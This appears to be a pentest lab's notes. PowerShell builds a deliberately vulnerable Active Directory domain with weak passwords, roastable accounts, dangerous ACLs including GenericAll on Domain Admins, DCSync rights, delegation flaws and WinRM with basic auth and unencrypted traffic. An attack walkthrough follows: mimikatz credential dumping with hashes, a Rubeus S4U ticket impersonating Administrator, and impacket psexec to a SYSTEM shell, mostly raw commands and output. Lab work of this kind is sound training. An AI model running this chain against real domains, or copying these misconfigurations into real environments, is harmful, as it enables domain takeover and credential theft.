#===== initial akses
alfred (bf heapspray weakpass)
penguin (kerberoast) CIFS -- read public
bane (aseproasting - crack weakpass)
riddler (desc)
#----- privesc with pass
gordon (kdbx on folder administrator) --> dcsync
bruce (ansible enc folder public)  --> lucius (Unconstrained Delegation)
harley (ssh passprase on folder patient on hugo) --> DA
hugo (kdbx on share folder using alfred) -->winrm (local admin on arkam) --> BH
#----- turn off password complexity
#----- enable psremoting
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Service\Auth\Basic -Value $true
Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true
Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*'

#-----
Import-Module ActiveDirectory

$domain = "gotham.local"
$baseDN = "DC=gotham,DC=local"
$ouPath = "OU=GothamLab,$baseDN"

New-ADOrganizationalUnit -Name "GothamLab" -Path $baseDN -ErrorAction SilentlyContinue

$groups = @("WayneEnterprises", "Arkham", "Rogues", "JusticeLeague")
foreach ($group in $groups) {
    New-ADGroup -Name $group -SamAccountName $group -GroupScope Global -GroupCategory Security -Path $ouPath -ErrorAction SilentlyContinue
}

$users = @(
    @{Name="alfred"; Group="WayneEnterprises"; Password="P@ssw0rd"},
    @{Name="bruce"; Group="WayneEnterprises"; Password="Bruc3Wayne!"},
    @{Name="gordon"; Group="JusticeLeague"; Password="Commiss10n3r"},
    @{Name="lucius"; Group="WayneEnterprises"; Password="P@ssw0rd2024"},
    @{Name="joker"; Group="Rogues"; Password="WhyS0Serious!"},
    @{Name="bane"; Group="Rogues"; Password="Welcome2024!"},
    @{Name="riddler"; Group="Rogues"; Password="Riddl3M3Th1s"; Description="Riddl3M3Th1s"},
    @{Name="harley"; Group="Rogues"; Password="Gotham2024!"},
    @{Name="penguin"; Group="Rogues"; Password="Penguin2024!"},
    @{Name="hugo"; Group="Arkham"; Password="Str4ngeMind!"}
)
#-- add riddler on remote management user

foreach ($user in $users) {
    $securePass = ConvertTo-SecureString $user.Password -AsPlainText -Force
    $upn = "$($user.Name)@$domain"
    $dn = "CN=$($user.Name),$ouPath"
    New-ADUser -Name $user.Name -SamAccountName $user.Name -UserPrincipalName $upn -AccountPassword $securePass -Enabled $true -Path $ouPath -PasswordNeverExpires $true
    Add-ADGroupMember -Identity $user.Group -Members $user.Name
}

#----- on arkham
net localgroup Administrators gotham\hugo /add
#----- ridller can reset hugo password
$attacker = Get-ADUser -Identity "riddler"
$sid = New-Object System.Security.Principal.SecurityIdentifier($attacker.SID)
$target = Get-ADUser -Identity "hugo"
$targetPath = "LDAP://" + $target.DistinguishedName
$entry = [ADSI]$targetPath
$acl = $entry.ObjectSecurity
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule ($sid, "GenericWrite", "Allow")
$acl.AddAccessRule($rule)
$entry.ObjectSecurity = $acl
$entry.CommitChanges()

#----- Kerberoast
Set-ADUser -Identity "penguin" -ServicePrincipalNames @{Add="CIFS/client01.gotham.local"}
#-- add penguin as localadmin on client01
net localgroup Administrators gotham\penguin /add
#----- AS-REP Roasting
$user = Get-ADUser bane -Properties userAccountControl
$uac = $user.userAccountControl
$newUAC = $uac -bor 4194304
Set-ADUser bane -Replace @{userAccountControl=$newUAC}

#----- ACL: bruce can GenericWrite on lucius
$attacker = Get-ADUser -Identity "bruce"
$sid = New-Object System.Security.Principal.SecurityIdentifier($attacker.SID)
$target = Get-ADUser -Identity "lucius"
$targetPath = "LDAP://" + $target.DistinguishedName
$entry = [ADSI]$targetPath
$acl = $entry.ObjectSecurity
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule ($sid, "GenericWrite", "Allow")
$acl.AddAccessRule($rule)
$entry.ObjectSecurity = $acl
$entry.CommitChanges()
#----- Unconstrained Delegation
Set-ADAccountControl -Identity "lucius" -TrustedForDelegation $true

#----- harley has GenericAll on Domain Admins
$da = Get-ADGroup -Identity "Domain Admins"
$ldapPath = "LDAP://" + $da.DistinguishedName
$entry = [ADSI]$ldapPath
$acl = $entry.ObjectSecurity
$harleySid = (New-Object System.Security.Principal.NTAccount("harley")).Translate([System.Security.Principal.SecurityIdentifier])
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule (
    $harleySid,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)

$acl.AddAccessRule($rule)
$entry.ObjectSecurity = $acl
$entry.CommitChanges()


#----- Grant DCSync Rights to gordon on Domain Object
$domainDN = (Get-ADDomain).DistinguishedName
dsacls $domainDN /G "gordon:CA;Replicating Directory Changes" /I:S
dsacls $domainDN /G "gordon:CA;Replicating Directory Changes All" /I:S

#----- KCD
Import-Module ActiveDirectory

$sourceComputer = "arkham"
$targetComputer = "dc09"

$source = Get-ADComputer -Identity $sourceComputer
$target = Get-ADComputer -Identity $targetComputer

Set-ADComputer -Identity $sourceComputer -PrincipalsAllowedToDelegateToAccount $target.DistinguishedName

$services = @("HTTP", "CIFS")

foreach ($service in $services) {
    Set-ADComputer -Identity $sourceComputer -Add @{
        "msDS-AllowedToDelegateTo" = "TERMSRV/$targetComputer"
    }
    Write-Host "Constrained Delegation granted for service $service"
}

#----- RBCD
Import-Module ActiveDirectory

Set-ADComputer arkham$ -PrincipalsAllowedToDelegateToAccount file05$

#--exploit
1. login as alfred
2. upload mimikatz and rubeus
3. run mimikatz sekurlsa::logonpasswords
c:\Windows\Tasks> mimikatz

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

sekurlsa::logonpasswords
mimikatz # 
Authentication Id : 0 ; 328704 (00000000:00050400)
Session           : Interactive from 1
User Name         : alfred
Domain            : GOTHAM
Logon Server      : DC09
Logon Time        : 7/10/2025 3:48:19 AM
SID               : S-1-5-21-2067154850-3160576461-1270927553-1108
	msv :	
	 [00000003] Primary
	 * Username : alfred
	 * Domain   : GOTHAM
	 * NTLM     : e19ccf75ee54e06b06a5907af13cef42
	 * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
	 * DPAPI    : 54cf7a4d98425c50f4f46012209fd66a
	tspkg :	
	wdigest :	
	 * Username : alfred
	 * Domain   : GOTHAM
	 * Password : (null)
	kerberos :	
	 * Username : alfred
	 * Domain   : GOTHAM.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 27295 (00000000:00006a9f)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/10/2025 3:47:53 AM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : FILE05$
	 * Domain   : GOTHAM
	 * NTLM     : 89720071f21f9af8ea14e6e5674335b5 <======= for Rubeus
	 * SHA1     : a1f0d53b07fc8b1d8473713db086e5a829ca39f3
	 * DPAPI    : a1f0d53b07fc8b1d8473713db086e5a8
	tspkg :	
	wdigest :	
	 * Username : FILE05$
	 * Domain   : GOTHAM
	 * Password : (null)
	kerberos :	
	 * Username : FILE05$
	 * Domain   : gotham.local
	 * Password : T_[h>Y>Ru;npwNT.UPPFDtg>aQ`$;^)vyg3:Kf0KfYL7;L[8#)ve7U$GHI.500<4y-e,]ygRY..t6yCKi"R_GVEg Qf<DhRnX?fP:0CT=K_vQZ;o_s;o73N7
	ssp :	
	credman :	
	cloudap :	

 4. run rubeus 
 Rubeus.exe s4u /user:FILE05$ /rc4:89720071f21f9af8ea14e6e5674335b5 /impersonateuser:Administrator /msdsspn:CIFS/arkham.gotham.local /domain:gotham.local /ptt /nowrap
C:\Windows\Tasks> Rubeus.exe s4u /user:FILE05$ /rc4:89720071f21f9af8ea14e6e5674335b5 /impersonateuser:Administrator /msdsspn:CIFS/arkham.gotham.local /domain:gotham.local /ptt /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: S4U

[*] Using rc4_hmac hash: 89720071f21f9af8ea14e6e5674335b5
[*] Building AS-REQ (w/ preauth) for: 'gotham.local\FILE05$'
[*] Using domain controller: 172.16.10.100:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE2DCCBNSgAwIBBaEDAgEWooID7jCCA+phggPmMIID4qADAgEFoQ4bDEdPVEhBTS5MT0NBTKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZ290aGFtLmxvY2Fso4IDpjCCA6KgAwIBEqEDAgECooIDlASCA5DfjvvBss9CB7AKQJ8e7CC+T3kg/HxuR8A106IlkZeI9F+Fk5ROlDh0E/GxPqFLZ1W9mKXouH5QmD01lo3jV6jXakr1k8nbnqyVrIfFcKonq+IKLvG1B/waBdtjl8ZlXm+aI7KOf82A58uyFSSDnNPkZOlVQsWSEXmibJ2Sy7+VUpisO0ZiA/SjNe1N0H7gtorX93uC8aU+48LWmq0WybIIcxBxCj0GS1xQE0hZMSf07mwe8A7Nwyhs48Rs0TkpFFai41/ySuA5ukN6ICR7j9VtSrKQAzYXZam2OC8QtySMxs7FGgINWf9gY5y8N6b3VPe5Wg08bV5mEoMCGmdypf7UWw4Sre5MZDIaM4W9FOQPDl8i/F5G9xGLevUNvTYx4wK/PAJN+oXzsz8VM2KiB1kjI2Lu1/F1la2Wz5FyWR6G3bY0ven32m27GnxkxwA7fQ7oOW46MkamEY7CmrOkA8hrCXQbPdsovy/8jHc95jWwB722nMkoCdMJ3j/RAVp0HAnfNnwIni9uRAin9FYUC31UuQBjZwPT+iOwlopDYrE49bmLZaEmFlkkmaSVXOnzViUsdMHX/5ObofthyJuhFPeX+2cJgCn25SB0LK3fiiKDmZ7QxvmyUzZNVbAGRa9ip8fDEgW6iNkAmUswGfI39cCKlV2H4cFb0kVJJtPa1fGJ2T8A0x+BwRcy27OiF7Gf1xDAyXlA6Uy9PgOAZemrqKsTiwNRE/h4f0Pv1iC18/Sks6NBTLOD8V/A3i5gokujccpW8WtJt1xQ2gRMdNinvZj/fcgtDQfamwvWainIcDxv1gGnDjcGzjPiSTPFEhWGjubqPGfd5+6AWx3C9pZetMpNxLKUl4VuUxCn/PWTmZm7pEJW4ZF73Qein3UJ4XUev6OIntR2HJPubV0dEWMqtRlrrgGeUlLI6ZTM5sUyj54QShqL0E+bbfpSOTg80Uscp7kJLAc81R0vIBLvkiakZCGHL6g/7wMdNfjdxE2q8Wbj0a8p8Xm9pHXeRr47jIXDnS1uM1hTMjDXmasEk1omn5bcp3BLIfYzXcSMtKkR02h4fr7vqfEVCa8ods2qUqsJslRHenSineb/+WyGdFX8CXT51fRoUsw4j6qjQZpp6P2so1TfV9fBoQl9J3wAoFxEX0RRtEDCeLC0Y3RAyDPRZS/w3Iz7Ma2ktCik+M0uUqoPFh/fbbwSFUq+QAAFmZMLOqijgdUwgdKgAwIBAKKBygSBx32BxDCBwaCBvjCBuzCBuKAbMBmgAwIBF6ESBBAYPNyIDTzQZ6T5q+y6zAOmoQ4bDEdPVEhBTS5MT0NBTKIUMBKgAwIBAaELMAkbB0ZJTEUwNSSjBwMFAEDhAAClERgPMjAyNTA3MTAwNTQyMjNaphEYDzIwMjUwNzEwMTU0MjIzWqcRGA8yMDI1MDcxNzA1NDIyM1qoDhsMR09USEFNLkxPQ0FMqSEwH6ADAgECoRgwFhsGa3JidGd0Gwxnb3RoYW0ubG9jYWw=


[*] Action: S4U

[*] Building S4U2self request for: 'FILE05$@GOTHAM.LOCAL'
[*] Using domain controller: dc09.gotham.local (172.16.10.100)
[*] Sending S4U2self request to 172.16.10.100:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'FILE05$@GOTHAM.LOCAL'
[*] base64(ticket.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEZzCCBGNhggRfMIIEW6ADAgEFoQ4bDEdPVEhBTS5MT0NBTKIUMBKgAwIBAaELMAkbB0ZJTEUwNSSjggQsMIIEKKADAgESoQMCAQGiggQaBIIEFiPrRYDI+31lLMD+2+PMjFpf+JsQFBXvjS+h5TG3Ws5obkizwu/MsDsfMkj/X5QxEfAWZwdNYa5F/belHSZFqgafrWmd9TOfPd01PbN4V2WZLZaRI+2tRdAvoOFbcM29zYS5IbNR1H2yPypJbLaIykcFFLfdGwOzcv+Rhil5oQG6dovWsCzCgdMR2pOTZ6FvewNvKVp+he6HPSav9Vj0OC+rL6rxwUI0e/g17gMG6C6innapy6NW1cfzxrrDo1sbdV62i6dqQ9iZ210cxKKZCntwttQE3CEZM9OwUwwN2CXze0cZ5nQIUgxevyk3ti6b2VQ5ljPSHiz0VtGFKzi3lY7VnSKQv+tjgG4MTdjuRhuRDqfUxqxInAakWHLbFC87W8DNTnLVOdxfdn6XviIjUKW7lddE3+7kUu7g6n56ey/q8AxTE3DWSmsWTuOD76+fPDmNiaXLpBysMxzf+xaOYDR+aIhc9pe25zkSpfey5WfiLrRKD9fNh7fU25qOmoFfSqHLJ04yarwp4sZuEfH3i9LpDQXPFcIZbRvVad2+x5RVMyukL2Gbqd2unsHNsPua4uzPrJ23eLMa4nuc1SRCFDcn2GugKa1j9BBRAYoW5XA10WE3xxPyfyJk/eFuxynFFGY14oYUK+rGMYdUUmyodU1QCX73M4xbWTqbsswwud/4+Upxfyz6S71j6pmEW5AvRGh3BAtHJwqpw3AlXzzQujM7dgeu8xBmk4+BHUVGcsu0Av8FPbm5qYo9n2ZFKK5zottGkh/p4oOruntHcJxKgFxl2sIlzy7+aeDUUcDDrkBds5Z0FdyPMXG3lVFtr1z6bPdkx4lnusGNpsxLbQ6dSMNvKjEftpTHNUKrs7mFf9s5AoaxhdXVRUCoo91Vm2+s9Kw4WQux9AgFpAY61Vb19W4HogSHSPqFRsRHx+La8CJGkUAWE8p0f2pQEudVzz0I5AUcV1szarIez8hqLDXRqrANFGZwGbzjJ4vXxzUn0M/2RX04RJoaaLzUFNwzLeW/tiqYRPGdu8GioozFEMlwF9YSsDShc36CkiGvBkZ/a2PPjVn1aayQ3lhdhNN4LGbCTPkRMetFzdn63ey6006NmtJ01SMy6Q/YxL7u15Re5oUWye9E/yFzhTJxEvd4tUC9c+d4PcR/2XhmU3kdqeMkedJTUjPGkMq/MMFt6LqTFBvmFkmp/lMoJiplPbphBw0YLdI/Tz+huWYwD6CaHN04kHACOQPAKw6mp68vn+EfOYPO4wRMpGe7/H/E6YSvUhZr8g69VbQPXG24Zkyle95EMtIjY0KS5nxWI+Gfrh6n9PtwWrgO6YE1z8MwFi0JNz+9sxQV1RqkKhI8Rm+gkl1/F7G83LGIQ5tnXAXvpyU9CI4cV9V+W8aIo4HeMIHboAMCAQCigdMEgdB9gc0wgcqggccwgcQwgcGgKzApoAMCARKhIgQglyXvwLAqkZH+Itv0Z/0ZvPswOn2bn4pgMVinblBtxfOhDhsMR09USEFNLkxPQ0FMohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAAKEAAKURGA8yMDI1MDcxMDA1NDIyM1qmERgPMjAyNTA3MTAxNTQyMjNapxEYDzIwMjUwNzE3MDU0MjIzWqgOGwxHT1RIQU0uTE9DQUypFDASoAMCAQGhCzAJGwdGSUxFMDUk

[*] Impersonating user 'Administrator' to target SPN 'CIFS/arkham.gotham.local'
[*] Building S4U2proxy request for service: 'CIFS/arkham.gotham.local'
[*] Using domain controller: dc09.gotham.local (172.16.10.100)
[*] Sending S4U2proxy request to domain controller 172.16.10.100:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/arkham.gotham.local':

      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
[+] Ticket successfully imported!


5. get the last ticket and convert in kali
└─$ cat p.kirbi| base64 -d > l.kirbi 
                                                                                                                                                                                              
┌──(batman㉿kali2023)-[~/offsec/gotham]
└─$ impacket-ticketConverter l.kirbi p.ccache
Impacket v0.11.0 - Copyright 2023 Fortra

[*] converting kirbi to ccache...
[+] done

6. use psexec to login as administrator on arkham
impacket-psexec administrator@arkham.gotham.local -k -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on arkham.gotham.local.....
[*] Found writable share ADMIN$
[*] Uploading file kqIaGygs.exe
[*] Opening SVCManager on arkham.gotham.local.....
[*] Creating service bQDJ on arkham.gotham.local.....
[*] Starting service bQDJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.7309]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
